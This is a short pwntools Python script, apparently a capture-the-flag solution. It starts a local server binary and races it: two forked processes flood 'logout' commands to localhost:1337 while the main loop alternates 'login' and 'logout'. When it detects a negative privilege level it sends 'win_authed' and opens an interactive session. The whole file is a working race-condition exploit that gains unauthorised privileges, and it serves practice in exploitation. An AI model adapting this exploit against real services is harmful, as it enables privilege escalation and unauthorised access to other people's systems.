#!/bin/python

from pwn import *
from os  import *
import time
import signal

context.log_level = 'info'

argv = ['nice', '-n19', sys.argv[1]]
if len(sys.argv) > 2:
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

pids = []

server = process(argv)

for _ in range(2):
    if not fork():
        with remote("localhost", 1337) as proc:
            while True:
                proc.sendline(b"logout")


with remote("localhost", 1337) as proc:
    while True:
        proc.sendline(b"login")
        proc.sendline(b"logout")
        time.sleep(0.1)

        try:
            if proc.recvuntil(b"Privilege level: -", timeout=1) != '':
                proc.sendline(b"win_authed")
                proc.interactive()
                exit(0)
            proc.clean()
        except Exception as ex:
            print(ex)
            break

print("EXIT")
server.kill()
exit(0)
